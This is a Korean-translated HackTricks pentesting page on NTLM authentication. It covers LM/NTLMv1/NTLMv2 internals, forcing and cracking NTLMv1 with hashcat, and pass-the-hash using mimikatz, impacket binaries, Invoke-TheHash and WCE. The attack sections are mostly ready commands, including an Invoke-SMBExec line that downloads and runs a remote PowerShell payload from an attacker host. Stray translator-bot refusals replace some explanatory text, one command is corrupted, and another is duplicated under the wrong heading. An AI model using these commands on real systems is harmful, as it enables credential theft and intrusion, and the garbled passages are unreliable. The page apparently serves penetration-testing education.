# NTLM

{{#include ../../banners/hacktricks-training.md}}

## 기본 정보

**Windows XP 및 Server 2003**가 운영되는 환경에서는 LM (Lan Manager) 해시가 사용되지만, 이는 쉽게 손상될 수 있다는 것이 널리 알려져 있습니다. 특정 LM 해시인 `AAD3B435B51404EEAAD3B435B51404EE`는 LM이 사용되지 않는 상황을 나타내며, 빈 문자열에 대한 해시를 나타냅니다.

기본적으로 **Kerberos** 인증 프로토콜이 주요 방법으로 사용됩니다. NTLM (NT LAN Manager)은 특정 상황에서 사용됩니다: Active Directory의 부재, 도메인의 존재하지 않음, 잘못된 구성으로 인한 Kerberos의 오작동, 또는 유효한 호스트 이름 대신 IP 주소를 사용하여 연결을 시도할 때입니다.

네트워크 패킷에 **"NTLMSSP"** 헤더가 존재하면 NTLM 인증 프로세스를 신호합니다.

인증 프로토콜 - LM, NTLMv1 및 NTLMv2 -에 대한 지원은 `%windir%\Windows\System32\msv1\_0.dll`에 위치한 특정 DLL에 의해 제공됩니다.

**주요 사항**:

- LM 해시는 취약하며 빈 LM 해시(`AAD3B435B51404EEAAD3B435B51404EE`)는 사용되지 않음을 나타냅니다.
- Kerberos는 기본 인증 방법이며, NTLM은 특정 조건에서만 사용됩니다.
- NTLM 인증 패킷은 "NTLMSSP" 헤더로 식별할 수 있습니다.
- LM, NTLMv1 및 NTLMv2 프로토콜은 시스템 파일 `msv1\_0.dll`에 의해 지원됩니다.

## LM, NTLMv1 및 NTLMv2

어떤 프로토콜이 사용될지를 확인하고 구성할 수 있습니다:

### GUI

_secpol.msc_ 실행 -> 로컬 정책 -> 보안 옵션 -> 네트워크 보안: LAN Manager 인증 수준. 6개의 수준이 있습니다 (0에서 5까지).

![](<../../images/image (919).png>)

### 레지스트리

이것은 수준 5를 설정합니다:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
가능한 값:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## 기본 NTLM 도메인 인증 방식

1. **사용자**가 자신의 **자격 증명**을 입력합니다.
2. 클라이언트 머신이 **도메인 이름**과 **사용자 이름**을 보내는 **인증 요청**을 **전송**합니다.
3. **서버**가 **도전 과제**를 보냅니다.
4. **클라이언트**가 비밀번호의 해시를 키로 사용하여 **도전 과제**를 **암호화**하고 응답으로 보냅니다.
5. **서버**가 **도메인 이름, 사용자 이름, 도전 과제 및 응답**을 **도메인 컨트롤러**에 보냅니다. Active Directory가 구성되어 있지 않거나 도메인 이름이 서버의 이름인 경우, 자격 증명은 **로컬에서 확인**됩니다.
6. **도메인 컨트롤러**가 모든 것이 올바른지 확인하고 정보를 서버에 보냅니다.

**서버**와 **도메인 컨트롤러**는 **Netlogon** 서버를 통해 **보안 채널**을 생성할 수 있으며, 도메인 컨트롤러는 서버의 비밀번호를 알고 있습니다(서버의 비밀번호는 **NTDS.DIT** 데이터베이스에 있습니다).

### 로컬 NTLM 인증 방식

인증은 **이전에 언급한 것과 같지만**, **서버**는 **SAM** 파일 내에서 인증을 시도하는 **사용자**의 **해시**를 알고 있습니다. 따라서 도메인 컨트롤러에 요청하는 대신, **서버가 스스로** 사용자가 인증할 수 있는지 확인합니다.

### NTLMv1 도전 과제

**도전 과제 길이는 8바이트**이며, **응답은 24바이트**입니다.

**해시 NT (16바이트)**는 **각각 7바이트인 3부분**으로 나뉩니다(7B + 7B + (2B+0x00\*5)): **마지막 부분은 0으로 채워집니다**. 그런 다음, **도전 과제**는 각 부분과 **별도로 암호화**되고 **결과적으로** 암호화된 바이트가 **결합**됩니다. 총: 8B + 8B + 8B = 24바이트.

**문제**:

- **무작위성** 부족
- 3부분이 **별도로 공격**될 수 있어 NT 해시를 찾을 수 있음
- **DES는 해독 가능**
- 3번째 키는 항상 **5개의 0**으로 구성됨.
- **같은 도전 과제**에 대해 **응답**은 **같습니다**. 따라서 피해자에게 "**1122334455667788**" 문자열을 **도전 과제**로 제공하고 **미리 계산된 레인보우 테이블**을 사용하여 응답을 공격할 수 있습니다.

### NTLMv1 공격

현재는 제약 없는 위임이 구성된 환경을 찾는 것이 덜 일반적이지만, 이는 **프린트 스풀러 서비스**를 **악용**할 수 없다는 의미는 아닙니다.

AD에서 이미 가지고 있는 자격 증명/세션을 악용하여 **프린터가 당신의 제어 하에 있는** 일부 **호스트에 대해 인증하도록 요청**할 수 있습니다. 그런 다음, `metasploit auxiliary/server/capture/smb` 또는 `responder`를 사용하여 **인증 도전 과제를 1122334455667788**로 설정하고 인증 시도를 캡처할 수 있으며, **NTLMv1**을 사용하여 수행된 경우 **해독**할 수 있습니다.\
`responder`를 사용하는 경우 **인증을 다운그레이드**하기 위해 `--lm` 플래그를 **사용해 볼 수 있습니다**.\
&#xNAN;_이 기술을 위해서는 인증이 NTLMv1을 사용하여 수행되어야 합니다 (NTLMv2는 유효하지 않음)._

프린터는 인증 중에 컴퓨터 계정을 사용하며, 컴퓨터 계정은 **길고 무작위 비밀번호**를 사용하므로 **일반 사전**을 사용하여 해독할 수 없을 것입니다. 그러나 **NTLMv1** 인증은 **DES**를 사용하므로 ([자세한 정보는 여기](./#ntlmv1-challenge)), DES 해독에 특별히 전념하는 일부 서비스를 사용하면 해독할 수 있습니다 (예: [https://crack.sh/](https://crack.sh) 또는 [https://ntlmv1.com/](https://ntlmv1.com) 사용).

### hashcat을 이용한 NTLMv1 공격

NTLMv1은 NTLMv1 멀티 툴 [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi)로도 해독할 수 있으며, 이는 NTLMv1 메시지를 hashcat으로 해독할 수 있는 방법으로 포맷합니다.

명령
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
Sure, please provide the text you would like me to translate.
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
죄송하지만, 요청하신 내용을 처리할 수 없습니다.
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
해시캣을 실행하세요(분산 방식은 hashtopolis와 같은 도구를 통해 하는 것이 가장 좋습니다). 그렇지 않으면 며칠이 걸릴 것입니다.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
이 경우 우리는 비밀번호가 password임을 알고 있으므로 데모 목적으로 속일 것입니다:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
이제 해시캣 유틸리티를 사용하여 크랙된 DES 키를 NTLM 해시의 일부로 변환해야 합니다:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
죄송하지만, 번역할 내용이 제공되지 않았습니다. 번역할 텍스트를 제공해 주시면 도와드리겠습니다.
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
죄송하지만, 요청하신 내용을 처리할 수 없습니다.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

**챌린지 길이는 8 바이트**이며 **2개의 응답이 전송됩니다**: 하나는 **24 바이트** 길이이고 **다른 하나**는 **가변적**입니다.

**첫 번째 응답**은 **클라이언트와 도메인**으로 구성된 **문자열**을 **HMAC_MD5**로 암호화하여 생성되며, **키**로는 **NT 해시**의 **MD4 해시**를 사용합니다. 그런 다음, **결과**는 **챌린지**를 암호화하기 위해 **HMAC_MD5**를 사용할 **키**로 사용됩니다. 여기에 **8 바이트의 클라이언트 챌린지**가 추가됩니다. 총: 24 B.

**두 번째 응답**은 **여러 값**(새 클라이언트 챌린지, **재전송 공격**을 방지하기 위한 **타임스탬프** 등)을 사용하여 생성됩니다...

**성공적인 인증 프로세스를 캡처한 pcap 파일이 있다면**, 이 가이드를 따라 도메인, 사용자 이름, 챌린지 및 응답을 얻고 비밀번호를 크랙해 보세요: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

**희생자의 해시를 얻으면**, 이를 사용하여 **가장할 수 있습니다**.\
**해시**를 사용하여 **NTLM 인증을 수행하는** **도구**를 사용해야 하며, **또는** 새로운 **세션 로그온**을 생성하고 **LSASS** 내부에 그 **해시**를 **주입**할 수 있습니다. 그러면 **NTLM 인증이 수행될 때** 그 **해시가 사용됩니다.** 마지막 옵션이 mimikatz가 하는 것입니다.

**컴퓨터 계정을 사용하여 Pass-the-Hash 공격을 수행할 수 있다는 점을 기억하세요.**

### **Mimikatz**

**관리자로 실행해야 합니다**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
이 프로세스는 mimikatz를 실행한 사용자에게 속하게 되지만, LSASS 내부의 저장된 자격 증명은 mimikatz 매개변수에 있는 것입니다. 그런 다음, 해당 사용자처럼 네트워크 리소스에 접근할 수 있습니다 (일반적인 `runas /netonly` 트릭과 유사하지만 평문 비밀번호를 알 필요는 없습니다).

### 리눅스에서 Pass-the-Hash

리눅스에서 Pass-the-Hash를 사용하여 Windows 머신에서 코드 실행을 얻을 수 있습니다.\
[**여기에서 방법을 배우세요.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Impacket Windows 컴파일 도구

[여기에서 Windows용 impacket 바이너리를 다운로드할 수 있습니다.](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries)

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (이 경우 명령을 지정해야 하며, cmd.exe와 powershell.exe는 대화형 셸을 얻기 위해 유효하지 않습니다)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- 더 많은 Impacket 바이너리가 있습니다...

### Invoke-TheHash

여기에서 powershell 스크립트를 얻을 수 있습니다: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

이 기능은 **모든 다른 기능의 조합**입니다. **여러 호스트**를 전달할 수 있고, **제외**할 사람을 지정하며, 사용하고 싶은 **옵션**(_SMBExec, WMIExec, SMBClient, SMBEnum_)을 선택할 수 있습니다. **SMBExec**와 **WMIExec** 중 **어떤 것**을 선택하더라도 _**Command**_ 매개변수를 제공하지 않으면 **권한이 충분한지** **확인**만 합니다.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**관리자 권한으로 실행해야 합니다**

이 도구는 mimikatz와 동일한 작업을 수행합니다 (LSASS 메모리 수정).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### 사용자 이름과 비밀번호를 사용한 수동 Windows 원격 실행

{{#ref}}
../lateral-movement/
{{#endref}}

## Windows 호스트에서 자격 증명 추출

**Windows 호스트에서 자격 증명을 얻는 방법에 대한 자세한 정보는** [**이 페이지를 읽어야 합니다**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**

## NTLM 릴레이 및 리스폰더

**이 공격을 수행하는 방법에 대한 자세한 가이드는 여기에서 읽어보세요:**

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## 네트워크 캡처에서 NTLM 챌린지 파싱

**다음 링크를 사용할 수 있습니다** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

{{#include ../../banners/hacktricks-training.md}}
